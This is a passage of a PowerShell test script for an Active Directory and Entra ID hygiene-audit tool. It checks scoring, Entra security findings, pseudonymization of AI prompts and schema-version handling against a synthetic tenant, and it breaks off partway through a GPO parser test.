# Worst-severity caps: one Critical alone cannot score above E, one High above C.
$oneCrit = Get-HygieneScore -Findings @([PSCustomObject]@{ Type = 'c1'; Severity = 'Critical' })
$oneHigh = Get-HygieneScore -Findings @([PSCustomObject]@{ Type = 'h1'; Severity = 'High' })
$fewLow = Get-HygieneScore -Findings (1..3 | ForEach-Object { [PSCustomObject]@{ Type = "l$_"; Severity = 'Low' } })
Assert-True ($oneCrit.Score -le 35 -and $oneCrit.Grade -eq 'E' -and $oneHigh.Score -le 65 -and $fewLow.Score -ge 95) "score caps by worst severity (crit $($oneCrit.Score)/$($oneCrit.Grade), high $($oneHigh.Score), 3 low $($fewLow.Score))"
# A test.com-like vulnerable lab (3 Critical, 10 High, 18 Medium, 4 Low checks) must grade F.
$lab = @(1..3 | ForEach-Object { [PSCustomObject]@{ Type = "c$_"; Severity = 'Critical' } }) + @(1..10 | ForEach-Object { [PSCustomObject]@{ Type = "h$_"; Severity = 'High' } }) +
    @(1..18 | ForEach-Object { [PSCustomObject]@{ Type = "m$_"; Severity = 'Medium' } }) + @(1..4 | ForEach-Object { [PSCustomObject]@{ Type = "l$_"; Severity = 'Low' } })
$labScore = Get-HygieneScore -Findings $lab
Assert-True ($labScore.Grade -eq 'F') "fully vulnerable lab grades F (got $($labScore.Score)/$($labScore.Grade))"
# Coverage: a score built on less than half of the catalog is flagged as not reliable.
$covOk = Get-HygieneScore -Findings @() -NotEvaluated 20 -Total 100
$covLow = Get-HygieneScore -Findings @() -NotEvaluated 72 -Total 100
Assert-True ($covOk.Reliable -and $covOk.Coverage -eq 80) 'score: 80% coverage is reliable'
Assert-True ((-not $covLow.Reliable) -and $covLow.Coverage -eq 28) 'score: 28% coverage is flagged not reliable'
# Nameless {} entries from an old PS 5.1 password-quality report are ignored.
$pqPh = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$pqPh | Add-Member -NotePropertyName passwordQuality -NotePropertyValue ([PSCustomObject]@{ emptyPassword = [PSCustomObject]@{}; breachedPassword = @([PSCustomObject]@{}); clearTextPassword = $null; duplicatePasswordGroups = @() }) -Force
$rPqPh = Invoke-Analysis $pqPh
Assert-True (@($rPqPh.Findings | Where-Object { $_.Type -like 'pwq_*' }).Count -eq 0) 'empty-object password-quality lists produce no nameless findings'

# ------------------------------------------------------------------ Entra
Write-Host "[entra]"
& (Join-Path $PSScriptRoot 'New-SyntheticEntraSnapshot.ps1') -OutFile (Join-Path $tmp 'entra.json') | Out-Null
$entra = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$script:RefDate = ConvertTo-UtcDate $entra.meta.collectedAtUtc
$ecfg = @{ MaxGlobalAdmins = 4; StaleGuestDays = 90; SecretExpiringDays = 30; MaxStandingAdmins = 2; MaxSecretLifetimeDays = 180; AdminInactiveDays = 90; MaxDevicesPerUser = 10 }
$ef = @(Invoke-EntraChecks -Snapshot $entra -Config $ecfg)
function EHas { param([string]$Type, [string]$Object = '', [string]$Sev = '') @($ef | Where-Object { $_.Type -eq $Type -and (-not $Object -or $_.Object -eq $Object) -and (-not $Sev -or $_.Severity -eq $Sev) }).Count -gt 0 }
Assert-True (EHas 'entra_security_defaults_off') 'entra: security defaults off + no CA MFA'
# Conditional Access / security defaults not collected (e.g. a personal account): no "no policy does X" finding may appear.
$entraNoCa = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraNoCa.conditionalAccess = $null; $entraNoCa.securityDefaults = $null
$entraNoCa.meta.collectionErrors = @(@($entraNoCa.meta.collectionErrors) + @(
        [PSCustomObject]@{ section = 'conditionalAccess'; message = 'BadRequest (synthetic)' }, [PSCustomObject]@{ section = 'securityDefaults'; message = 'BadRequest (synthetic)' }))
$efNoCa = @(Invoke-EntraChecks -Snapshot $entraNoCa -Config $ecfg)
$caTypes = @($efNoCa | Where-Object { $script:EntraCheckCatalog[$_.Type].Needs -contains 'conditionalAccess' } | ForEach-Object { $_.Type } | Select-Object -Unique)
Assert-True ($caTypes.Count -eq 0) "entra: no Conditional Access finding when conditionalAccess failed (got $($caTypes -join ','))"
# A tenant where nothing could be collected must not get a score.
$entraGap = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraGap.meta.collectionErrors = @($script:EntraCheckCatalog.Values | ForEach-Object { $_.Needs } | Where-Object { $_ } | Select-Object -Unique | ForEach-Object { [PSCustomObject]@{ section = "$_"; message = 'BadRequest (synthetic)' } })
$gapNE = @(Get-EntraNotEvaluated -Snapshot $entraGap)
$gapScore = Get-HygieneScore -Findings @() -NotEvaluated $gapNE.Count -Total $script:EntraCheckCatalog.Count
Assert-True (-not $gapScore.Reliable) "score: a tenant where nothing was collected is not reliable (coverage $($gapScore.Coverage)%)"
Assert-True (EHas 'entra_admins_without_mfa' 'bob.admin@moosebank.onmicrosoft.com' 'Critical') 'entra: GA without MFA'
Assert-True (EHas 'entra_admins_without_mfa' 'carol.sec@moosebank.onmicrosoft.com') 'entra: Security Admin without MFA'
Assert-True (EHas 'entra_privileged_guest') 'entra: guest in privileged role'
Assert-True (EHas 'entra_app_high_privilege' 'Backup Automation' 'Critical') 'entra: SP with RoleManagement.ReadWrite.Directory'
Assert-True (-not (EHas 'entra_app_high_privilege' 'Monitoring SP')) 'entra: read-only app permission not flagged as takeover'
Assert-True (-not (EHas 'entra_app_high_privilege' 'Benign SP')) 'entra: benign SP not flagged'
Assert-True (EHas 'entra_users_can_register_apps') 'entra: users can register apps'
Assert-True (EHas 'entra_report_only_ca_stale' 'Report-only MFA test') 'entra: report-only CA policy flagged'
Assert-True (EHas 'entra_app_credential_expiring' 'Legacy Sync App') 'entra: expiring app secret'
Assert-True (EHas 'entra_app_credential_expiring' 'Reporting App') 'entra: expired app secret'
Assert-True (EHas 'entra_stale_guest') 'entra: stale guest'
Assert-True (-not (EHas 'entra_global_admins_excessive') -and -not (EHas 'entra_global_admins_too_few')) 'entra: 3 GAs = neither excessive nor too few'
# Schema 2 checks (CIS M365 / Microsoft Entra best practices)
Assert-True (EHas 'entra_admin_synced_from_onprem' 'dave.appadmin@moosebank.onmicrosoft.com' 'High') 'entra: admin synced from on-premises'
Assert-True (-not (EHas 'entra_admin_synced_from_onprem' 'user10@moosebank.onmicrosoft.com')) 'entra: synced non-admin not flagged'
Assert-True (EHas 'entra_pim_not_used' 'admin roles' 'Medium') 'entra: 4 permanent admins > 2 emergency accounts'
Assert-True (EHas 'entra_no_phishing_resistant_admins') 'entra: no phishing-resistant MFA for admins'
Assert-True (-not (EHas 'entra_device_code_flow_allowed')) 'entra: device code blocked -> not flagged'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_risk_policies_missing' })[0].Detail) -match 'user risk' -and (@($ef | Where-Object { $_.Type -eq 'entra_risk_policies_missing' })[0].Detail) -notmatch 'sign-in risk') 'entra: only user-risk policy missing'
Assert-True (EHas 'entra_admin_sign_in_frequency') 'entra: no admin sign-in frequency'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_weak_auth_methods' })[0].Detail) -match 'Sms' -and (@($ef | Where-Object { $_.Type -eq 'entra_weak_auth_methods' })[0].Detail) -notmatch 'Voice') 'entra: enabled weak methods listed, disabled ones not'
Assert-True (EHas 'entra_users_can_create_tenants') 'entra: users can create tenants'
Assert-True (EHas 'entra_users_can_create_security_groups') 'entra: users can create security groups (CIS 5.1.3.1)'
Assert-True (EHas 'entra_no_periodic_reauth') 'entra: no periodic reauthentication for all users (CIS 5.2.2.13)'
Assert-True (EHas 'entra_sign_in_risk_not_blocked') 'entra: sign-in risk only gets MFA, not blocked (CIS 5.2.2.8)'
# A policy that does block medium + high sign-in risk satisfies 5.2.2.8.
$entraRisk = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraRisk.conditionalAccess = @($entraRisk.conditionalAccess) + [PSCustomObject]@{ id = 'r'; displayName = 'Block risky sign-ins'; state = 'enabled'; includeUsers = @('All'); excludeUsers = @(); includeRoles = @()
    includeApplications = @('All'); clientAppTypes = @('all'); userRiskLevels = @(); signInRiskLevels = @('high', 'medium'); transferMethods = ''; grantControls = @('block'); authStrengthId = ''; signInFrequency = $false }
Assert-True (-not @(Invoke-EntraChecks -Snapshot $entraRisk -Config $ecfg | Where-Object { $_.Type -eq 'entra_sign_in_risk_not_blocked' }).Count) 'entra: blocking policy for medium + high sign-in risk satisfies the check'
# Schema 3: the rest of CIS M365 v7 that Graph can read.
Assert-True (EHas 'entra_admin_inactive' 'ext.partner_gmail.com#EXT#@moosebank.onmicrosoft.com') 'entra: admin with no sign-in for 400 days'
Assert-True (-not (EHas 'entra_admin_inactive' 'alice.ceo@moosebank.onmicrosoft.com')) 'entra: active admin not flagged as inactive'
Assert-True (EHas 'entra_no_emergency_access') 'entra: no account excluded from every CA policy (CIS 1.1.2)'
Assert-True ((EHas 'entra_admin_licensed' 'alice.ceo@moosebank.onmicrosoft.com') -and -not (EHas 'entra_admin_licensed' 'bob.admin@moosebank.onmicrosoft.com')) 'entra: admin with E5 flagged, admin with only Entra ID P2 not (CIS 1.1.4)'
Assert-True ((EHas 'entra_per_user_mfa_admins' 'bob.admin@moosebank.onmicrosoft.com') -and -not (EHas 'entra_per_user_mfa_admins' 'alice.ceo@moosebank.onmicrosoft.com')) 'entra: per-user MFA enforced flagged, disabled not (CIS 5.1.2.1)'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_users_not_mfa_capable' })[0].Object) -eq '4 users') 'entra: members not MFA capable counted (CIS 5.2.3.4)'
Assert-True ((EHas 'entra_password_expiry_set' 'moosebank-cloud.example') -and -not (EHas 'entra_password_expiry_set' 'moosebank.onmicrosoft.com')) 'entra: expiring domain flagged, never-expire domain not (CIS 1.3.1)'
Assert-True (EHas 'entra_idle_timeout_missing') 'entra: no idle session timeout (CIS 1.3.2)'
Assert-True (EHas 'entra_kmsi_shown') 'entra: stay signed in shown (CIS 5.1.2.5)'
Assert-True (EHas 'entra_users_can_create_m365_groups') 'entra: users can create M365 groups (CIS 5.1.3.4)'
Assert-True ((EHas 'entra_device_join_unrestricted') -and (EHas 'entra_device_quota_high') -and (EHas 'entra_device_join_ga_local_admin') -and (EHas 'entra_device_join_user_local_admin' '' 'Medium') -and (EHas 'entra_device_laps_off')) 'entra: device settings (CIS 5.1.4.1-5)'
Assert-True (EHas 'entra_users_read_bitlocker_keys') 'entra: users can read BitLocker keys (CIS 5.1.4.6)'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_app_management_policy_weak' })[0].Detail) -match 'policy is off') 'entra: app management policy off (CIS 5.1.5.3-6)'
Assert-True (EHas 'entra_password_hash_sync_off') 'entra: synced tenant without password hash sync (CIS 5.1.8.1)'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_admin_sign_in_frequency' })[0].Detail) -match 'non-persistent browser') 'entra: admin sessions lack frequency and non-persistent browser (CIS 5.2.2.4)'
Assert-True ((EHas 'entra_no_managed_device') -and (EHas 'entra_security_info_registration') -and (EHas 'entra_intune_enrollment_reauth')) 'entra: managed device, registration, Intune enrollment (CIS 5.2.2.9-11)'
Assert-True ((EHas 'entra_no_geo_restriction') -and -not (EHas 'entra_no_trusted_locations')) 'entra: country list unused flagged, trusted HQ range satisfies 5.2.2.14'
Assert-True ((EHas 'entra_token_protection_off') -and (EHas 'entra_auth_transfer_allowed')) 'entra: token protection and authentication transfer (CIS 5.2.2.16-17)'
Assert-True (((@($ef | Where-Object { $_.Type -eq 'entra_authenticator_context_off' })[0].Detail) -match 'location: default') -and (EHas 'entra_system_preferred_mfa_off') -and (EHas 'entra_authenticator_lite_on')) 'entra: Authenticator context, system-preferred MFA, Authenticator Lite (CIS 5.2.3.1, .6, .10)'
Assert-True ((EHas 'entra_no_admin_access_review') -and -not (EHas 'entra_no_guest_access_review')) 'entra: admin roles not reviewed, guests reviewed (CIS 5.3.2-3)'
Assert-True (((@($ef | Where-Object { $_.Type -eq 'entra_pim_activation_no_approval' })[0].Detail) -match 'Privileged Role Administrator') -and ((@($ef | Where-Object { $_.Type -eq 'entra_pim_activation_no_approval' })[0].Detail) -notmatch 'Global Administrator')) 'entra: only the role without approval is listed (CIS 5.3.4-5)'
# Schema 4: non-human identities, consent, hybrid.
Assert-True ((EHas 'entra_risky_delegated_grant' 'Mail Helper Pro' 'Medium') -and -not (EHas 'entra_risky_delegated_grant' 'Monitoring SP')) 'entra: third-party mail grant flagged, own harmless admin grant not'
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_privileged_app_owner' })[0].Detail) -match 'user12') 'entra: regular user owning a tenant-takeover app'
Assert-True ((EHas 'entra_first_party_sp_credentials' 'Office 365 Exchange Online' 'High') -and -not (EHas 'entra_first_party_sp_credentials' 'Mail Helper Pro')) 'entra: credential on a Microsoft app flagged, third-party app without credential not'
Assert-True (EHas 'entra_sp_in_admin_role' 'Backup Automation' 'High') 'entra: service principal in an admin role'
Assert-True ((EHas 'entra_admin_password_old' 'alice.ceo@moosebank.onmicrosoft.com') -and -not (EHas 'entra_admin_password_old' 'bob.admin@moosebank.onmicrosoft.com')) 'entra: 500-day admin password flagged, 30-day not'
Assert-True ((EHas 'entra_admin_no_phishing_resistant_method' 'bob.admin@moosebank.onmicrosoft.com') -and -not (EHas 'entra_admin_no_phishing_resistant_method' 'alice.ceo@moosebank.onmicrosoft.com')) 'entra: admin with SMS only flagged, admin with FIDO2 not'
Assert-True (EHas 'entra_sync_stale') 'entra: directory sync 3 days old'
Assert-True (EHas 'entra_cross_tenant_mfa_trust') 'entra: MFA trusted from any tenant'
Assert-True ((EHas 'entra_app_insecure_redirect' 'Legacy Sync App') -and -not (EHas 'entra_app_insecure_redirect' 'Healthy App')) 'entra: HTTP redirect flagged, HTTPS and localhost not'
Assert-True (EHas 'entra_federated_domain' 'moosebank.example' 'Medium') 'entra: federated domain trusting IdP MFA = Medium'
# Schema 5: cross-tenant direct connect, entitlement management, workload identity CA.
Assert-True ((@($ef | Where-Object { $_.Type -eq 'entra_b2b_direct_connect_open' })[0].Detail) -match 'inbound' -and (@($ef | Where-Object { $_.Type -eq 'entra_b2b_direct_connect_open' })[0].Detail) -notmatch 'outbound') 'entra: B2B direct connect open inbound only'
Assert-True ((EHas 'entra_access_package_external_no_approval' 'Project Elk partners' 'High') -and -not (EHas 'entra_access_package_external_no_approval' 'Vendor portal')) 'entra: external package without approval flagged, vetted vendors with approval not'
Assert-True ((EHas 'entra_access_package_no_expiry' 'Finance share') -and -not (EHas 'entra_access_package_no_expiry' 'Project Elk partners')) 'entra: package without expiry or review flagged'
Assert-True (((@($ef | Where-Object { $_.Type -eq 'entra_no_workload_identity_ca' })[0].Detail) -match 'Backup Automation') -and ((@($ef | Where-Object { $_.Type -eq 'entra_no_workload_identity_ca' })[0].Detail) -notmatch 'Office 365|func-payroll-mi')) 'entra: own privileged app without workload CA; Microsoft app and managed identity not counted'
Assert-True (EHas 'entra_app_high_privilege' 'func-payroll-mi' 'Critical') 'entra: managed identity with a tenant-wide permission still flagged as high privilege'
$entraWl = Import-ADSnapshot (Join-Path $tmp 'entra.json')
@($entraWl.conditionalAccess)[1].includeServicePrincipals = @('ServicePrincipalsInMyTenant')
Assert-True (-not @(Invoke-EntraChecks -Snapshot $entraWl -Config $ecfg | Where-Object { $_.Type -eq 'entra_no_workload_identity_ca' }).Count) 'entra: a policy on service principals satisfies workload CA'
$entraV4 = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraV4.meta.schemaVersion = 4
$entraV4.PSObject.Properties.Remove('accessPackages')
$v5Types = @('entra_b2b_direct_connect_open', 'entra_access_package_external_no_approval', 'entra_access_package_no_expiry', 'entra_no_workload_identity_ca')
Assert-True (-not @(Invoke-EntraChecks -Snapshot $entraV4 -Config $ecfg | Where-Object { $v5Types -contains $_.Type }).Count) 'entra v4: no findings from schema 5 data'
$neV4 = @(Get-EntraNotEvaluated -Snapshot $entraV4 | ForEach-Object { $_.Type })
Assert-True (@($v5Types | Where-Object { $neV4 -notcontains $_ }).Count -eq 0) 'entra v4: schema 5 checks listed as not evaluated'
$epz5 = New-EntraPseudonymizer -Snapshot $entra
$eprompt5 = New-EntraAiPrompt -Findings $ef -Pz $epz5 -Snapshot $entra -Score (Get-HygieneScore -Findings $ef)
Assert-True ($eprompt5.IndexOf('Project Elk', [StringComparison]::OrdinalIgnoreCase) -lt 0 -and $eprompt5.IndexOf('Finance share', [StringComparison]::OrdinalIgnoreCase) -lt 0) 'entra prompt: access package names pseudonymized'
# A schema 3 snapshot: none of the schema 4 checks fire, and they show as not evaluated.
$entraV3 = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraV3.meta.schemaVersion = 3
foreach ($p in 'oauthGrants', 'crossTenant') { $entraV3.PSObject.Properties.Remove($p) }
$v4Types = @('entra_privileged_app_owner', 'entra_sp_in_admin_role', 'entra_admin_password_old', 'entra_admin_no_phishing_resistant_method', 'entra_sync_stale', 'entra_app_insecure_redirect', 'entra_federated_domain', 'entra_risky_delegated_grant', 'entra_cross_tenant_mfa_trust')
Assert-True (-not @(Invoke-EntraChecks -Snapshot $entraV3 -Config $ecfg | Where-Object { $v4Types -contains $_.Type }).Count) 'entra v3: no findings from schema 4 data'
$neV3 = @(Get-EntraNotEvaluated -Snapshot $entraV3 | ForEach-Object { $_.Type })
Assert-True (@($v4Types | Where-Object { $neV3 -notcontains $_ }).Count -eq 0) 'entra v3: schema 4 checks listed as not evaluated'
# Fixing the gaps makes the findings go away.
$entraFix = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraFix.deviceRegistration.joinAllowedFor = 'selected'; $entraFix.deviceRegistration.userDeviceQuota = 10; $entraFix.deviceRegistration.globalAdminsAreLocalAdmins = $false
$entraFix.deviceRegistration.registeringUsersLocalAdmin = 'none'; $entraFix.deviceRegistration.lapsEnabled = $true
$entraFix.authenticatorSettings.showLocation = 'enabled'; $entraFix.authenticatorSettings.systemPreferred = 'enabled'; $entraFix.authenticatorSettings.companionApp = 'disabled'
$entraFix.appManagementPolicy = [PSCustomObject]@{ isEnabled = $true; keyRestrictions = @([PSCustomObject]@{ type = 'asymmetricKeyLifetime'; state = 'enabled'; maxLifetime = 'P90D' })
    passwordRestrictions = @([PSCustomObject]@{ type = 'passwordAddition'; state = 'enabled'; maxLifetime = '' }, [PSCustomObject]@{ type = 'passwordLifetime'; state = 'enabled'; maxLifetime = 'P180D' }, [PSCustomObject]@{ type = 'customPasswordAddition'; state = 'enabled'; maxLifetime = '' }) }
foreach ($p in @($entraFix.conditionalAccess)) { $p.excludeUsers = @('breakglass-1') }
$fixedTypes = @(Invoke-EntraChecks -Snapshot $entraFix -Config $ecfg | ForEach-Object { $_.Type })
Assert-True (-not @($fixedTypes | Where-Object { $_ -in 'entra_device_join_unrestricted', 'entra_device_quota_high', 'entra_device_join_ga_local_admin', 'entra_device_join_user_local_admin', 'entra_device_laps_off',
            'entra_authenticator_context_off', 'entra_system_preferred_mfa_off', 'entra_authenticator_lite_on', 'entra_app_management_policy_weak', 'entra_no_emergency_access' }).Count) 'entra: compliant settings produce no schema 3 findings'
# A schema 2 snapshot: no schema 3 findings, and they show as not evaluated.
$entraV2 = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraV2.meta.schemaVersion = 2
foreach ($p in 'pimPolicies', 'authenticatorSettings', 'groupCreation', 'deviceRegistration', 'appManagementPolicy', 'domains', 'idleTimeout', 'branding', 'onPremSync', 'accessReviews', 'namedLocations', 'licenses', 'perUserMfa') { $entraV2.PSObject.Properties.Remove($p) }
$v3Types = @('entra_no_emergency_access', 'entra_admin_licensed', 'entra_users_not_mfa_capable', 'entra_no_managed_device', 'entra_token_protection_off', 'entra_device_laps_off', 'entra_pim_activation_no_approval', 'entra_users_read_bitlocker_keys')
Assert-True (-not @(Invoke-EntraChecks -Snapshot $entraV2 -Config $ecfg | Where-Object { $v3Types -contains $_.Type }).Count) 'entra v2: no findings from schema 3 data it does not have'
$neV2 = @(Get-EntraNotEvaluated -Snapshot $entraV2 | ForEach-Object { $_.Type })
Assert-True (@($v3Types | Where-Object { $neV2 -notcontains $_ }).Count -eq 0) 'entra v2: schema 3 checks listed as not evaluated'
# No sign-in data (no P1): checks based on last sign-in stay silent.
$entraNoSignIn = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraNoSignIn.meta.collectionErrors = @([PSCustomObject]@{ section = 'signInActivity'; message = 'no P1 (synthetic)' })
$efNoSignIn = @(Invoke-EntraChecks -Snapshot $entraNoSignIn -Config $ecfg | ForEach-Object { $_.Type })
Assert-True (-not ($efNoSignIn -contains 'entra_stale_guest') -and -not ($efNoSignIn -contains 'entra_admin_inactive')) 'entra: without sign-in data, stale guest and inactive admin stay silent'
# CIS 5.1.6.3: members inviting guests is flagged too; admins-only is fine.
$entraInv = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraInv.authorizationPolicy.allowInvitesFrom = 'adminsGuestInvitersAndAllMembers'
$okMembers = @(Invoke-EntraChecks -Snapshot $entraInv -Config $ecfg | Where-Object { $_.Type -eq 'entra_guest_invite_open' }).Count -eq 1
$entraInv.authorizationPolicy.allowInvitesFrom = 'adminsAndGuestInviters'
$okAdmins = @(Invoke-EntraChecks -Snapshot $entraInv -Config $ecfg | Where-Object { $_.Type -eq 'entra_guest_invite_open' }).Count -eq 0
Assert-True ($okMembers -and $okAdmins) 'entra: guest invitations by all members flagged, admins-only not'
Assert-True (EHas 'entra_user_consent_allowed' '' 'Medium') 'entra: legacy user consent = Medium'
Assert-True (EHas 'entra_guest_access_not_restricted' '' 'Low') 'entra: default guest access = Low'
Assert-True (EHas 'entra_banned_passwords_off') 'entra: custom banned passwords off'
Assert-True (EHas 'entra_smart_lockout_weak') 'entra: smart lockout 20 / 30 s flagged'
Assert-True ((EHas 'entra_app_secret_long_lived' 'Legacy Sync App') -and -not (EHas 'entra_app_secret_long_lived' 'Healthy App')) 'entra: 730-day secret flagged, 170-day not'
# An MFA requirement through an authentication strength counts as MFA.
$entraStr = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraStr.conditionalAccess = @($entraStr.conditionalAccess) + [PSCustomObject]@{ id = 'x'; displayName = 'Admins phishing-resistant'; state = 'enabled'; includeUsers = @(); excludeUsers = @(); includeRoles = @('62e90394-69f5-4237-9190-012177145e10')
    includeApplications = @('All'); clientAppTypes = @('all'); userRiskLevels = @(); signInRiskLevels = @(); transferMethods = ''; grantControls = @(); authStrengthId = '00000000-0000-0000-0000-000000000004'; signInFrequency = $true
    excludeGroups = @(); includeUserActions = @(); includeLocations = @(); excludeLocations = @(); signInFrequencyInterval = 'timeBased'; persistentBrowser = 'never'; tokenProtection = $false }
$efStr = @(Invoke-EntraChecks -Snapshot $entraStr -Config $ecfg)
Assert-True (-not @($efStr | Where-Object { $_.Type -in 'entra_no_ca_mfa_admins', 'entra_no_phishing_resistant_admins', 'entra_admin_sign_in_frequency' }).Count) 'entra: authentication-strength policy satisfies admin MFA, phishing resistance and sign-in frequency'
# A schema 1 snapshot (older collector) must not produce false positives on the new checks.
$entraV1 = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraV1.meta.schemaVersion = 1
foreach ($p in 'authenticationMethods', 'passwordSettings', 'pim') { $entraV1.PSObject.Properties.Remove($p) }
$efV1 = @(Invoke-EntraChecks -Snapshot $entraV1 -Config $ecfg)
$neV1 = @(Get-EntraNotEvaluated -Snapshot $entraV1 | ForEach-Object { $_.Type })
Assert-True (-not @($efV1 | Where-Object { $_.Type -in 'entra_no_phishing_resistant_admins', 'entra_weak_auth_methods', 'entra_pim_not_used', 'entra_banned_passwords_off', 'entra_no_periodic_reauth', 'entra_sign_in_risk_not_blocked' }).Count) 'entra v1: no findings from data it does not have'
Assert-True (($neV1 -contains 'entra_no_phishing_resistant_admins') -and ($neV1 -contains 'entra_pim_not_used') -and ($neV1 -contains 'entra_weak_auth_methods')) 'entra v1: new checks listed as not evaluated'
# Entra AI pseudonymization + report
$epz = New-EntraPseudonymizer -Snapshot $entra
$eprompt = New-EntraAiPrompt -Findings $ef -Pz $epz -Snapshot $entra -Score (Get-HygieneScore -Findings $ef)
Assert-True (@(Test-EntraLeak -Pz $epz -Text $eprompt).Count -eq 0) "entra leak check clean: $((Test-EntraLeak -Pz $epz -Text $eprompt) -join ', ')"
foreach ($secret in 'moosebank', 'onmicrosoft', 'bob.admin', 'Backup Automation', '11111111-2222', 'gmail') {
    Assert-True ($eprompt.IndexOf($secret, [StringComparison]::OrdinalIgnoreCase) -lt 0) "entra prompt must not contain '$secret'"
}
$escore = Get-HygieneScore -Findings $ef
$ehtml = ConvertTo-EntraReportHtml -Snapshot $entra -Findings $ef -Score $escore -NotEvaluated @() -ToolVersion 'test' -ElapsedText '0s' -AiResult $null
Assert-True ($ehtml -match '</html>\s*$' -and $ehtml -match 'Entra ID Hygiene Report' -and ([regex]::Matches($ehtml, "class='pie-chart-wrap'")).Count -ge 2) 'entra HTML renders the finding donuts'
Assert-True (($ehtml -match 'Users by type') -and ($ehtml -match 'MFA registration') -and ($ehtml -match 'Service principals') -and ($ehtml -match 'Tenant at a glance') -and ($ehtml -match 'Privileged role assignments')) 'entra HTML has the tenant info donuts and the at-a-glance table'
# A tenant with no Entra ID P1/P2 and no CA policy: one note instead of the "no policy" findings; security defaults still checked.
$entraFree = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entraFree.licenses = @(); $entraFree.conditionalAccess = @(); $entraFree.securityDefaults = $true
foreach ($u in @($entraFree.users)) { $u.licenses = @() }
$efFree = @(Invoke-EntraChecks -Snapshot $entraFree -Config $ecfg)
$freeCa = @($efFree | Where-Object { $_.Type -ne 'entra_ca_not_available' -and $script:EntraCheckCatalog[$_.Type].Needs -contains 'conditionalAccess' })
Assert-True (@($efFree | Where-Object { $_.Type -eq 'entra_ca_not_available' }).Count -eq 1) 'entra: no P1/P2 and no CA policy gives the single "CA not available" note'
Assert-True ($freeCa.Count -eq 0) "entra: no CA-based finding without a P1/P2 licence (got $(@($freeCa | ForEach-Object { $_.Type } | Select-Object -Unique) -join ','))"
$entraFree.securityDefaults = $false
Assert-True (@(Invoke-EntraChecks -Snapshot $entraFree -Config $ecfg | Where-Object { $_.Type -eq 'entra_security_defaults_off' }).Count -eq 1) 'entra: without P1/P2, security defaults off is still flagged'
Assert-True (@($ef | Where-Object { $_.Type -eq 'entra_ca_not_available' }).Count -eq 0) 'entra: a P2 tenant does not get the "CA not available" note'
# Not-evaluated when a section fails
$entra2 = Import-ADSnapshot (Join-Path $tmp 'entra.json')
$entra2.meta.collectionErrors = @([PSCustomObject]@{ section = 'mfaRegistration'; message = 'no audit log scope (synthetic)' })
$ene = @(Get-EntraNotEvaluated -Snapshot $entra2)
Assert-True (@($ene | Where-Object { $_.Type -eq 'entra_admins_without_mfa' }).Count -eq 1) 'entra: mfa check not-evaluated when reports section fails'

# ------------------------------------------------------------ AI prompt files
# An empty key stops right before the HTTP call, so nothing goes out.
Write-Host "[ai files]"
$aiHtml = Join-Path $tmp 'aitest.html'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'demo.json') -OutHtml $aiHtml -SendToAI -ApiKey '' 6>&1 2>&1 | Out-Null
$aiPromptFile = Join-Path $tmp 'aitest_ai_prompt.txt'
Assert-True (Test-Path $aiPromptFile) 'the prompt is saved next to the report before any send'
$aiPromptText = if (Test-Path $aiPromptFile) { [System.IO.File]::ReadAllText($aiPromptFile) } else { '' }
Assert-True ($aiPromptText -match '=== SYSTEM ===' -and $aiPromptText -match '=== USER ===' -and $aiPromptText -match 'DOMAIN-1') 'saved prompt holds system and user parts, pseudonymized'
Assert-True ($aiPromptText.IndexOf('moosebank', [StringComparison]::OrdinalIgnoreCase) -lt 0) 'saved prompt has no real domain name'
Assert-True (-not (Test-Path (Join-Path $tmp 'aitest_ai_response.json'))) 'no reply file when nothing was sent'
$aiDry = Join-Path $tmp 'dry.txt'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'demo.json') -OutHtml (Join-Path $tmp 'drytest.html') -AiDryRun $aiDry 6>&1 2>&1 | Out-Null
Assert-True ((Test-Path $aiDry) -and [System.IO.File]::ReadAllText($aiDry) -eq $aiPromptText) 'dry run writes the same text that a real send saves'
$entraHtml = Join-Path $tmp 'entratest.html'
& (Join-Path $root 'IDWolf.ps1') -Snapshot (Join-Path $tmp 'entra.json') -OutHtml $entraHtml -SendToAI -ApiKey '' 6>&1 2>&1 | Out-Null
Assert-True (Test-Path (Join-Path $tmp 'entratest_ai_prompt.txt')) 'entra: the prompt is saved next to the report too'

# ------------------------------------------------------------ AD collector: GPO scripts, tasks, groups
# The parser runs on real-format files in a temp folder (no SYSVOL needed).
Write-Host "[gpo extras parser]"
$cAst = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $root 'Collect-ADSnapshot.ps1'), [ref]$null, [ref]$null)
foreach ($fn in 'ConvertFrom-IniText', 'Read-GpoExtras') {
    . ([scriptblock]::Create($cAst.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $fn }, $true).Extent.Text))
}
$gd = Join-Path $tmp 'gpofolder'
foreach ($d in 'Machine\Scripts', 'Machine\Preferences\ScheduledTasks', 'Machine\Preferences\Groups', 'MACHINE\Microsoft\Windows NT\SecEdit') { New-Item -ItemType Directory -Force (Join-Path $gd $d) | Out-Null }
$u16 = New-Object System.Text.UnicodeEncoding($false, $true)
[System.IO.File]::WriteAllText((Join-Path $gd 'Machine\Scripts\scripts.ini'), "`r`n[Startup]`r`n0CmdLine=\\fs01\it$\boot.cmd`r`n0Parameters=/q`r`n", $u16)
[System.IO.File]::WriteAllText((Join-Path $gd 'Machine\Preferences\ScheduledTasks\ScheduledTasks.xml'), @'
